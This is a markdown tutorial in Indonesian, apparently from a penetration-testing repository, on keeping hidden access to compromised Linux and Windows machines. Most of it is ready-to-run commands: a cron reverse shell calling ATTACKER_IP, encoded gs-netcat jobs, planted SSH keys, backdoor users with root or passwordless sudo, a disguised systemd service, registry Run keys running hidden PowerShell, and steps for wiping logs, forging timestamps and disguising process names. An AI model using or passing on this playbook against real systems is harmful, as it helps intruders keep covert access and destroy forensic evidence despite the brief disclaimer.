# 🔒 Persistence Techniques

## 📋 Overview

Persistence adalah teknik untuk mempertahankan akses pada sistem target setelah mendapatkan akses awal. Tujuannya adalah agar akses tetap tersedia meskipun sistem di-restart atau ada perubahan konfigurasi.

## ⚠️ Disclaimer

Teknik ini hanya untuk penetration testing yang sah dan tujuan edukasi. Penggunaan ilegal adalah tanggung jawab pengguna.

## 🎯 Tujuan Persistence

- ✅ Mempertahankan akses setelah reboot
- ✅ Survive system updates dan patches
- ✅ Backup access jika primary method terdeteksi
- ✅ Stealth operation untuk jangka panjang

## 🔧 Metode Persistence

### 1. Cron Jobs (Linux/Unix)

**Tujuan**: Menjalankan reverse shell secara berkala

#### Basic Cron Persistence:
```bash
# Setiap menit
echo "* * * * * bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" >> /var/spool/cron/root

# Setiap 5 menit
echo "*/5 * * * * /usr/bin/gs-netcat -c -s secret -i" | crontab -

# Setiap jam pada menit ke-0
echo "0 * * * * /tmp/.hidden/shell.sh" | crontab -

# Setiap hari jam 3 pagi
echo "0 3 * * * /usr/local/bin/maintenance.sh" | crontab -
```

#### Stealth Cron Jobs:
```bash
# Gunakan nama script yang terlihat normal
echo "*/10 * * * * /usr/bin/system-update" | crontab -
echo "0 2 * * * /usr/local/bin/log-rotate" | crontab -

# Encode command untuk menghindari deteksi
ENCODED=$(echo "gs-netcat -c -s secret -i" | base64)
echo "*/5 * * * * echo '$ENCODED' | base64 -d | bash" | crontab -

# User-specific crontab (tidak perlu root)
crontab -e
# Tambahkan: */5 * * * * /home/user/.local/bin/update-check
```

#### Cron Job Management:
```bash
# List current cron jobs
crontab -l

# Edit cron jobs
crontab -e

# Remove all cron jobs
crontab -r

# Backup cron jobs
crontab -l > cron_backup.txt
```

### 2. SSH Keys

**Tujuan**: Akses SSH tanpa password

#### Generate SSH Key Pair:
```bash
# Generate key pair
ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key -N ""

# Generate dengan nama yang tidak mencurigakan
ssh-keygen -t ed25519 -f ~/.ssh/system_maintenance -N ""
```

#### Plant SSH Public Key:
```bash
# Add ke authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2E... user@host" >> ~/.ssh/authorized_keys

# Set proper permissions
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Multiple users
for user in root admin user; do
    echo "ssh-rsa AAAAB3NzaC1yc2E... backdoor" >> /home/$user/.ssh/authorized_keys
done
```

#### Stealth SSH Keys:
```bash
# Gunakan comment yang tidak mencurigakan
ssh-keygen -t rsa -C "system-maintenance@$(hostname)" -f backdoor_key

# Hide dalam authorized_keys
echo "# System maintenance key - DO NOT REMOVE" >> ~/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2E... system-maintenance@$(hostname)" >> ~/.ssh/authorized_keys
```

#### SSH Config Modifications:
```bash
# Allow root login (jika disabled)
sed -i 's/#PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config

# Allow password authentication
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Restart SSH service
systemctl restart sshd
```

### 3. User Creation

**Tujuan**: Membuat user backdoor dengan privileges

#### Create Backdoor User:
```bash
# Create user dengan home directory
useradd -m -s /bin/bash backdoor_user

# Set password
echo "backdoor_user:SecretPass123" | chpasswd

# Add to sudo group
usermod -aG sudo backdoor_user

# Create user yang terlihat normal
useradd -m -s /bin/bash system-service
echo "system-service:$(openssl rand -base64 12)" | chpasswd
```

#### Stealth User Creation:
```bash
# User dengan UID tinggi (kurang mencurigakan)
useradd -u 65534 -g 65534 -s /bin/bash -d /var/lib/nobody nobody-service

# User dengan nama sistem
useradd -r -s /bin/bash -d /var/lib/systemd systemd-network-helper

# Hide user dari login screen
echo "system-service:*:18000:0:99999:7:::" >> /etc/shadow
```

#### User Privilege Escalation:
```bash
# Add to sudoers without password
echo "backdoor_user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Add to specific groups
usermod -aG wheel,adm,sys backdoor_user

# Direct root access
echo "backdoor_user:x:0:0:System Service:/root:/bin/bash" >> /etc/passwd
```

### 4. Systemd Services (Linux)

**Tujuan**: Persistence via system services

#### Create Systemd Service:
```bash
# Create service file
cat > /etc/systemd/system/network-monitor.service << EOF
[Unit]
Description=Network Connectivity Monitor
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=5
ExecStart=/usr/local/bin/network-check.sh
User=nobody
Group=nobody

[Install]
WantedBy=multi-user.target
EOF

# Create the script
cat > /usr/local/bin/network-check.sh << 'EOF'
#!/bin/bash
while true; do
    gs-netcat -c -s "secret_key" -i
    sleep 300
done
EOF

chmod +x /usr/local/bin/network-check.sh

# Enable and start service
systemctl enable network-monitor.service
systemctl start network-monitor.service
```

### 5. Registry Persistence (Windows)

**Tujuan**: Windows registry-based persistence

#### Run Keys:
```cmd
# Current user
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "C:\Windows\Temp\update.exe"

# All users
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\System32\security.exe"

# RunOnce (runs once then removes itself)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command IEX(payload)"
```

#### Service Creation (Windows):
```cmd
# Create Windows service
sc create "WindowsUpdateService" binpath= "C:\Windows\System32\update.exe" start= auto
sc description "WindowsUpdateService" "Windows Update Background Service"
sc start "WindowsUpdateService"
```

## 📁 Struktur Direktori

- **[cron-jobs/](./cron-jobs/)**: Script dan contoh cron jobs
- **[ssh-keys/](./ssh-keys/)**: Management SSH keys untuk persistence
- **[user-creation/](./user-creation/)**: Script untuk membuat backdoor users
- **[log-cleaning/](./log-cleaning/)**: Teknik menghapus jejak aktivitas

## 🧹 Log Cleaning & Anti-Forensics

### Clear Command History:
```bash
# Clear bash history
history -c
history -w
echo "" > ~/.bash_history

# Clear zsh history
echo "" > ~/.zsh_history

# Disable history logging
unset HISTFILE
export HISTSIZE=0
```

### Clear System Logs:
```bash
# Clear auth logs
> /var/log/auth.log
> /var/log/secure

# Clear Apache/Nginx logs
> /var/log/apache2/access.log
> /var/log/apache2/error.log
> /var/log/nginx/access.log

# Clear system logs
> /var/log/syslog
> /var/log/messages

# Clear wtmp/utmp (login records)
> /var/log/wtmp
> /var/log/utmp
> /var/log/lastlog
```

### Timestamp Manipulation:
```bash
# Change file timestamps
touch -r /etc/passwd backdoor_file
touch -t 202301010000 suspicious_file

# Batch timestamp change
find /path -name "*.log" -exec touch -r /etc/passwd {} \;
```

## ⚡ Tips Praktis

### 1. Stealth Considerations:
- Gunakan nama file/service yang terlihat legitimate
- Set timestamps yang masuk akal
- Gunakan permissions yang sesuai
- Hindari high-frequency execution

### 2. Multiple Persistence Methods:
```bash
# Kombinasi multiple methods
# 1. Cron job
echo "*/10 * * * * /usr/bin/system-check" | crontab -

# 2. SSH key
echo "ssh-rsa AAAAB3... maintenance@system" >> ~/.ssh/authorized_keys

# 3. Systemd service
systemctl enable backdoor.service

# 4. User account
useradd -r -s /bin/bash system-helper
```

### 3. Monitoring & Maintenance:
```bash
# Check if persistence is still active
crontab -l | grep system-check
systemctl status backdoor.service
id system-helper
```

### 4. Cleanup Script:
```bash
#!/bin/bash
# Remove all persistence mechanisms
crontab -r
userdel -r system-helper
systemctl disable backdoor.service
rm /etc/systemd/system/backdoor.service
sed -i '/ssh-rsa.*maintenance/d' ~/.ssh/authorized_keys
```

## 🚨 Detection Evasion

### 1. Avoid Common Patterns:
- Jangan gunakan `/tmp` untuk file persistence
- Hindari nama file yang obvious (shell.sh, backdoor.exe)
- Gunakan legitimate system paths

### 2. Timing Considerations:
- Jangan set cron job setiap menit
- Randomize execution times
- Avoid peak hours

### 3. Process Hiding:
```bash
# Change process name
exec -a "systemd-worker" gs-netcat -c -s secret -i

# Use legitimate process paths
cp gs-netcat /usr/lib/systemd/systemd-networkd
```

---

**Next**: [04-JavaScript-Enumeration](../04-JavaScript-Enumeration/) - Enumerasi JavaScript untuk bug bounty
